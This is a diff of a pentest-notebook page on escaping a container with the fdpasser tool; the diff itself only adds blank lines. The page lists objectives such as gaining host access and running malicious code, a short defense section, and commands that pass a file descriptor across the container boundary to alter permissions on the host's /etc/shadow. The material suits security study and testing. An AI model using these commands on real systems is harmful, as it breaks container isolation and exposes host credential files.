@@ -31,11 +31,15 @@ Technical Explanation: The fdpasser command is used to pass file descriptors bet
 
 Business Value: Containerization provides an efficient and scalable way to deploy and run applications. However, a misconfigured or vulnerable container can lead to a complete compromise of the host system. By understanding the risks associated with containerization, organizations can take steps to secure their infrastructure and prevent attacks.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable or misconfigured container
 
 1. Ability to execute the fdpasser command
+
+ 
 
 ## Defense
 
@@ -45,6 +49,8 @@ Business Value: Containerization provides an efficient and scalable way to deplo
 
 1. Regularly monitor and audit container activity for suspicious behavior
 
+ 
+
 ## Objectives
 
 1. Gain access to the host system from within a container
@@ -53,12 +59,20 @@ Business Value: Containerization provides an efficient and scalable way to deplo
 
 1. Execute malicious code on the host system
 
+ 
+
 # Instructions
 
 1. This command allows sending and receiving file descriptors between different processes or containers. The 'fdpasser' command can be used to send and receive file descriptors between different processes or containers. In order to use this command, you need to have root privileges in the container. The command has two modes of operation: 'send' and 'recv'.
 
+ 
+
+
+
 **Code**: [[https://github.com/FSecureLABS/fdpasser
 In contain]]
+
+
 
 > To receive a file descriptor, run the following command in the container as root:
 
@@ -74,11 +88,17 @@ ls -la /etc/shadow
 
 The output should show the updated permissions for the file.
 
+
+
 **Command** ([[Receive file inside container]]):
 
 ```bash
 ./fdpasser recv /moo /etc/shadow
 ```
+
+
+
+
 
 **Command** ([[Send file outside container]]):
 
@@ -86,11 +106,17 @@ The output should show the updated permissions for the file.
 ./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
 ```
 
+
+
+
+
 **Command** ([[List file permissions outside container]]):
 
 ```bash
 ls -la /etc/shadow
 ```
+
+
 
 ## Commands Used
 
@@ -102,3 +128,5 @@ ls -la /etc/shadow
 
 - [[Breaking out of containers using a device file]]
 - [[Container - Docker Pentest]]
+
+
